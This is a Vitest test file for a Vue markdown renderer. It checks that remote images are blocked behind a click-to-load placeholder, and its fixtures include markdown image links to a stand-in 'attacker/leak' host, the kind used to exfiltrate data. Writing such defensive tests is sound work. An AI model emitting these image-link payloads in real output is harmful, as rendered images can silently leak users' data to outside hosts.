// @vitest-environment happy-dom
import { describe, it, expect } from 'vitest';
import { mount } from '@vue/test-utils';
import MarkdownRenderer from '../MarkdownRenderer.vue';

const REMOTE = '![x](https://attacker/leak?d=1)';
const DATA_IMG = '![y](data:image/png;base64,iVBORw0KGgo=)';

describe('MarkdownRenderer remote-image gating', () => {
  it('blocks remote images and shows a host placeholder with zero image nodes', () => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content: REMOTE, allowRemoteImages: false },
    });

    // Absence of the <img> node under happy-dom IS the zero-network guarantee.
    expect(wrapper.findAll('img[src^="https://attacker"]')).toHaveLength(0);
    const button = wrapper.find('button');
    expect(button.exists()).toBe(true);
    expect(button.text()).toContain('attacker');
  });

  it('loads the remote image only after the placeholder is clicked', async () => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content: REMOTE, allowRemoteImages: false },
    });

    expect(wrapper.find('img').exists()).toBe(false);

    await wrapper.find('button').trigger('click');

    const img = wrapper.find('img[src="https://attacker/leak?d=1"]');
    expect(img.exists()).toBe(true);
  });

  it('renders remote images immediately when the prop is omitted (chat unchanged)', () => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content: REMOTE },
    });

    expect(wrapper.find('img[src="https://attacker/leak?d=1"]').exists()).toBe(true);
    expect(wrapper.find('button').exists()).toBe(false);
  });

  it('renders data: images immediately even when remote images are blocked', () => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content: DATA_IMG, allowRemoteImages: false },
    });

    expect(wrapper.find('img[src^="data:image/png"]').exists()).toBe(true);
    expect(wrapper.find('button').exists()).toBe(false);
  });

  it.each([
    ['uppercase scheme', '![x](HTTPS://attacker/leak?d=1)'],
    ['scheme-relative', '![x](//attacker/leak?d=1)'],
    ['plain http', '![x](http://attacker/leak?d=1)'],
  ])('gates %s behind the placeholder (no eager img)', (_label, content) => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content, allowRemoteImages: false },
    });

    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('button').exists()).toBe(true);
  });

  it('renders a sanitized-away (data:text/html) image src as a static blocked label, not a clickable placeholder', () => {
    const wrapper = mount(MarkdownRenderer, {
      props: { content: '![x](DATA:text/html,<b>x</b>)', allowRemoteImages: false },
    });

    // '#' sanitized src is not loadable: no img, and no click-to-load button that would fetch '#'.
    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('button').exists()).toBe(false);
    expect(wrapper.find('.markdown-image-blocked').exists()).toBe(true);
  });
});
